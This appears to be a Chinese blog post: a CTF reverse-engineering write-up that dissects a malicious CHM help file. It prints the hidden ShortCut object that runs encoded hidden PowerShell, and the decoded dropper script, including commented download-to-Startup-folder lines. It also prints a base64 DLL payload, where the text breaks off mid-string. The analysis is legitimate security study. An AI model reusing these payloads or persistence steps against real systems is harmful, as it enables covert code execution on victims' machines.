<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>re-part-5 | wd-z711&#39;s B10g</title>
  <meta name="author" content="wd-z711">
  
  <meta name="description" content="Common student in China. Interested in web &amp; re.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="re-part-5"/>
  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-YHJSKZDC3Y', 'auto');
  ga('send', 'pageview');
</script>




<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> re-part-5</h1>
		</div>
	



<div class="row post">

	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>来到难度5咯，算是入门re了吧。</p>
<hr>
<h1 id="reverse-html"><a href="#reverse-html" class="headerlink" title="reverse_html"></a>reverse_html</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p> &emsp;发现是Microsoft Compiled HTML Help(v3)，搜了搜：<strong>微软HTML帮助集，即编译的HTML帮助文件（英语：Microsoft Compiled HTML Help, CHM），用来提供线上帮助，是一种应用较广泛的文件格式。因为CHM文件如一本书一样，可以提供内容目录、索引和搜索等功能，所以也常被用来制作电子书。</strong></p>
<span id="more"></span>
<p> &emsp;补充完知识点之后，直接反编译，得到：<code>doc.hhc</code>，<code>doc.htm</code>，<code>doc1.htm</code>。</p>
<p> &emsp;具体知识点看chm-study-notes，非常全哦。</p>
<p> &emsp;其中，doc.hhc是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;GENERATOR&quot; content=&quot;Microsoft&amp;reg; HTML Help Workshop 4.1&quot;&gt;</span><br><span class="line">&lt;!-- Sitemap 1.0 --&gt;</span><br><span class="line">&lt;/HEAD&gt;&lt;BODY&gt;</span><br><span class="line">  &lt;UL&gt;</span><br><span class="line">  &lt;LI&gt; &lt;OBJECT type=&quot;text/sitemap&quot;&gt;</span><br><span class="line">			&lt;param name=&quot;Name&quot; value=&quot;IPv4 Advanced IP Settings Tab&quot;&gt;</span><br><span class="line">			&lt;param name=&quot;Local&quot; value=&quot;doc1.htm&quot;&gt;</span><br><span class="line">	   &lt;/OBJECT&gt;</span><br><span class="line">  &lt;/UL&gt;</span><br><span class="line">  &lt;UL&gt;</span><br><span class="line">  &lt;LI&gt; &lt;OBJECT type=&quot;text/sitemap&quot;&gt;</span><br><span class="line">			&lt;param name=&quot;Name&quot; value=&quot;IPv4 Advanced WINS Tab&quot;&gt;</span><br><span class="line">			&lt;param name=&quot;Local&quot; value=&quot;doc1.htm&quot;&gt;</span><br><span class="line">	   &lt;/OBJECT&gt;</span><br><span class="line">  &lt;/UL&gt;</span><br><span class="line">  &lt;UL&gt;</span><br><span class="line">  &lt;LI&gt; &lt;OBJECT type=&quot;text/sitemap&quot;&gt;</span><br><span class="line">			&lt;param name=&quot;Name&quot; value=&quot;IPv4 Alternate Configuration Tab&quot;&gt;</span><br><span class="line">			&lt;param name=&quot;Local&quot; value=&quot;doc1.htm&quot;&gt;</span><br><span class="line">	   &lt;/OBJECT&gt;</span><br><span class="line">  &lt;/UL&gt;</span><br><span class="line">  &lt;UL&gt;</span><br><span class="line">  &lt;LI&gt; &lt;OBJECT type=&quot;text/sitemap&quot;&gt;</span><br><span class="line">			&lt;param name=&quot;Name&quot; value=&quot;IPv4 and IPv6 Advanced DNS Tab&quot;&gt;</span><br><span class="line">			&lt;param name=&quot;Local&quot; value=&quot;doc1.htm&quot;&gt;</span><br><span class="line">	   &lt;/OBJECT&gt;</span><br><span class="line">  &lt;/UL&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp; 为什么没doc.htm的事情呢？一丝怀疑，打开doc.htm。发现其中有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">    &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">    &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">    &lt;PARAM name=&quot;Item1&quot;</span><br><span class="line">      value=&quot;,cmd.exe,/c START /MIN C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile powershell.exe -WindowStyle hidden -nologo -noprofile -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAbgBaAEYAZABhADgASQB3AEYASQBiAHYAQgAvADYASABVAEMAcwBvAG0ANwBIAHQAaAByAE0AZAB1ADMAQgArAGcARABDAG4AVwBJAGMAWAB5AHgAaABwAGUAOQBTAE8ATgBnAG4AcAAwAGUAcQAvAFgAMgBzAHIAMgAvAFYAeQBHAGQANAA4ADUAegBsADUAbQA4AFEATQBrAHgAZwBFAGsAbQBjAGkASQBPAC8ASwA0AEIAdABDAEoAUAA0ADUAUQAwAGoAcABHAHkARABkAFEARABDADYASgBKADQAYQBOADgAMQByAG0AbwA1AGwATABoAEwASgBvADIAbQBjAFEATgB2AFkASQB5AHEAdgAxADcATgBkAGgAOQByADkAQQBlADIANwAxAEgAWgBjAGIAMgBCAFoAVgBpACsARwBSAE8ANABrAFYAVwBKAG4AMwBCAEgARABCAEgASAAwAEMAcgBMAHEATwBaAFoAagAzAGIAdgAyAEkAOABWAFUARwBaADEALwBvAGIALwBXADgANgBYAHQAbABOAGoAVwB1AHoAOQBaAEwAVgBlAEwANgBlAHgAMQAwAG0ASgBEAHAAYwBZAGMATwBWAHQASgBuAHMAWgBpAHgAKwBaAHgAcQBHAFUAbQB0ADgAZwAyAHMAWQBoAGsAbgBqAEUAZgB1AFUAWQB5AEIAMwBGAGcAUwB5ADEAMwBtAHEAZgAxADMAVQBHAHgAUABTAFEASwBOAEEAMAA0AGwAbABxAGwAbQBBAFkAZQBrAFcAMQBoADAANwBnAHgAUQB5AG0AdwArAHEAMgBQADIAWQBLAFcAaQBwACsAZQB0AHkAbwBDAHcAeQBSAFoAdwB3AG4AYgBoAHEAbgB5AGkARQBVAHkAcABPAEUAKwBMAFEAbABtAEgASgAzAHMASQBuADkAOQBTAG0AYwBpAGcAdABOAGkAMgB6AFoATwA5AGEAbgBtAG0ATgBYAGcAdgAwAG4ALwBFAEcAUwBvAGkAeABYAGEARgBlAFMAVwBEAEQAcQAxAFEAeQBsAFEAbAB6AFMAUwA0AGcAZwBhAEMANAArAHAAbAB1AGsATAB6ADYARAAvADQATgBmAFAASwB1AGEARgA3AHcATgAyAFIANwBYADkAYgB3ACsAcwA3AE0ARwAyAEgAZQBmAFMAUQB6AFcAYQBkAEMAYwBpAGwARgBFAEIASQBNAEUAWgBpADYAMQAvAEEAQQA9AD0AJwApACkAKQApACwAIABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAIABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==&quot;&gt;</span><br><span class="line">    &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;标准的chm shortCut利用。</p>
<p>&emsp;它是打开了一个cmd.exe，之后又调用了powershell，<code>-WindowStyle Hidden</code>表示隐藏窗口， <code>-ExecutionPolicy Bypass</code>表示不会显示警告和提示，解码一下base64，脚本也处理一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># @Time  : 2022/12/08 23:29:01</span><br><span class="line"># @Author: wd-2711</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">init = &quot;49006e0076006f006b0065002d00450078007000720065007300730069006f006e002000240028004e00650077002d004f0062006a00650063007400200049004f002e00530074007200650061006d0052006500610064006500720020002800240028004e00650077002d004f0062006a00650063007400200049004f002e0043006f006d007000720065007300730069006f006e002e004400650066006c00610074006500530074007200650061006d0020002800240028004e00650077002d004f0062006a00650063007400200049004f002e004d0065006d006f0072007900530074007200650061006d00200028002c00240028005b0043006f006e0076006500720074005d003a003a00460072006f006d0042006100730065003600340053007400720069006e006700280027006e005a00460064006100380049007700460049006200760042002f00360048005500430073006f006d00370048007400680072004d0064007500330042002b006700440043006e00570049006300580079007800680070006500390053004f004e0067006e0070003000650071002f00580032007300720032002f0056007900470064003400380035007a006c0035006d00380051004d006b007800670045006b006d006300690049004f002f004b0034004200740043004a00500034003500510030006a007000470079004400640051004400430036004a004a00340061004e003800310072006d006f0035006c004c0068004c004a006f0032006d00630051004e00760059004900790071007600310037004e00640068003900720039004100650032003700310048005a0063006200320042005a00560069002b00470052004f0034006b00560057004a006e0033004200480044004200480048003000430072004c0071004f005a005a006a003300620076003200490038005600550047005a0031002f006f0062002f00570038003600580074006c004e006a00570075007a0039005a004c00560065004c00360065007800310030006d004a00440070006300590063004f00560074004a006e0073005a00690078002b005a0078007100470055006d0074003800670032007300590068006b006e006a00450066007500550059007900420033004600670053007900310033006d0071006600310033005500470078005000530051004b004e004100300034006c006c0071006c006d004100590065006b005700310068003000370067007800510079006d0077002b00710032005000320059004b005700690070002b006500740079006f0043007700790052005a00770077006e006200680071006e007900690045005500790070004f0045002b004c0051006c006d0048004a003300730049006e003900390053006d0063006900670074004e00690032007a005a004f00390061006e006d006d004e0058006700760030006e002f004500470053006f00690078005800610046006500530057004400440071003100510079006c0051006c007a00530053003400670067006100430034002b0070006c0075006b004c007a00360044002f0034004e00660050004b00750061004600370077004e0032005200370058003900620077002b00730037004d0047003200480065006600530051007a005700610064004300630069006c0046004500420049004d0045005a006900360031002f00410041003d003d00270029002900290029002c0020005b0049004f002e0043006f006d007000720065007300730069006f006e002e0043006f006d007000720065007300730069006f006e004d006f00640065005d003a003a004400650063006f006d0070007200650073007300290029002c0020005b0054006500780074002e0045006e0063006f00640069006e0067005d003a003a0041005300430049004900290029002e00520065006100640054006f0045006e006400280029003b&quot;</span><br><span class="line"></span><br><span class="line">for i in range(len(init)//4):</span><br><span class="line">    c = chr(int(init[i*4:i*4+2], 16))</span><br><span class="line">    print(c, end = &quot;&quot;)</span><br></pre></td></tr></table></figure>
<p>&emsp;得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression $(</span><br><span class="line">	New-Object IO.StreamReader(</span><br><span class="line">		$(New-Object IO.Compression.DeflateStream(</span><br><span class="line">			$(New-Object IO.MemoryStream(</span><br><span class="line">				$([Convert]::FromBase64String(</span><br><span class="line">&#x27;nZFda8IwFIbvB/6HUCsom7HthrMdu3B+gDCnWIcXyxhpe9SONgnp0eq/X2sr2/VyGd485zl5m8QMkxgEkmciIO/K4BtCJP45Q0jpGyDdQDC6JJ4aN81rmo5lLhLJo2mcQNvYIyqv17Ndh9r9Ae271HZcb2BZVi+GRO4kVWJn3BHDBHH0CrLqOZZj3bv2I8VUGZ1/ob/W86XtlNjWuz9ZLVeL6ex10mJDpcYcOVtJnsZix+ZxqGUmt8g2sYhknjEfuUYyB3FgSy13mqf13UGxPSQKNA04llqlmAYekW1h07gxQymw+q2P2YKWip+etyoCwyRZwwnbhqnyiEUypOE+LQlmHJ3sIn99SmcigtNi2zZO9anmmNXgv0n/EGSoixXaFeSWDDq1QylQlzSS4ggaC4+plukLz6D/4NfPKuaF7wN2R7X9bw+s7MG2HefSQzWadCcilFEBIMEZi61/AA==&#x27;</span><br><span class="line">				))</span><br><span class="line">			)), </span><br><span class="line">			[IO.Compression.CompressionMode]::Decompress</span><br><span class="line">		)), </span><br><span class="line">		[Text.Encoding]::ASCII</span><br><span class="line">	)</span><br><span class="line">).ReadToEnd()</span><br></pre></td></tr></table></figure>
<p>&emsp;查了查，在.net和powershell都能用这些函数，.net的话就得用C#写啦，自学了一波，直接上脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// See https://aka.ms/new-console-template for more information</span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.IO.Compression;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace VSCode_C_</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            string s = &quot;nZFda8IwFIbvB/6HUCsom7HthrMdu3B+gDCnWIcXyxhpe9SONgnp0eq/X2sr2/VyGd485zl5m8QMkxgEkmciIO/K4BtCJP45Q0jpGyDdQDC6JJ4aN81rmo5lLhLJo2mcQNvYIyqv17Ndh9r9Ae271HZcb2BZVi+GRO4kVWJn3BHDBHH0CrLqOZZj3bv2I8VUGZ1/ob/W86XtlNjWuz9ZLVeL6ex10mJDpcYcOVtJnsZix+ZxqGUmt8g2sYhknjEfuUYyB3FgSy13mqf13UGxPSQKNA04llqlmAYekW1h07gxQymw+q2P2YKWip+etyoCwyRZwwnbhqnyiEUypOE+LQlmHJ3sIn99SmcigtNi2zZO9anmmNXgv0n/EGSoixXaFeSWDDq1QylQlzSS4ggaC4+plukLz6D/4NfPKuaF7wN2R7X9bw+s7MG2HefSQzWadCcilFEBIMEZi61/AA==&quot;;</span><br><span class="line">            byte[] newBytes = Convert.FromBase64String(s);</span><br><span class="line">            MemoryStream tmp1 = new MemoryStream(newBytes);</span><br><span class="line">            DeflateStream tmp2 = new DeflateStream(tmp1, CompressionMode.Decompress);</span><br><span class="line">            StreamReader reader = new StreamReader(tmp2, Encoding.ASCII);</span><br><span class="line"></span><br><span class="line">            string text = reader.ReadToEnd();</span><br><span class="line">            Console.WriteLine(&quot;begin&quot;);  </span><br><span class="line">            Console.WriteLine(text);        </span><br><span class="line">            Console.WriteLine(&quot;end&quot;);  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// begin</span><br><span class="line">// # $client = new-object System.Net.WebClient;</span><br><span class="line">// # $client.DownloadFile(&quot;http://192.168.69.129:8000/ielogo.png&quot;, &quot;$env:temp/20203917.tmp&quot;)</span><br><span class="line">// # $client.DownloadFile(&quot;http://192.168.69.129:8000/_TMP12&quot;, &quot;%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\helper.bat&quot;)</span><br><span class="line">// # read file</span><br><span class="line">// $content = [IO.File]::ReadAllText(&quot;$pwd\doc.chm&quot;)</span><br><span class="line">// $idx1 = $content.IndexOf(&quot;xxxxxxxx&quot;)</span><br><span class="line">// $helper = $content.Substring($idx1 + 8)</span><br><span class="line">// $cont = [System.Convert]::FromBase64String($helper)</span><br><span class="line">// Set-Content &quot;$env:temp\20201122.tmp&quot; $cont -Encoding byte</span><br><span class="line">// end</span><br></pre></td></tr></table></figure>
<p>&emsp;上述输出代码的意思是：<strong>找到<code>xxxxxxxx</code>字符之后的base64，之后解码放到<code>20201122.tmp</code>中。</strong></p>
<p>&emsp;用010editor打开<code>doc.chm</code>，搜索<code>xxxxxxxx</code>字符之后的base64，写解码的ps1脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cont = [System.Convert]::FromBase64String(&quot;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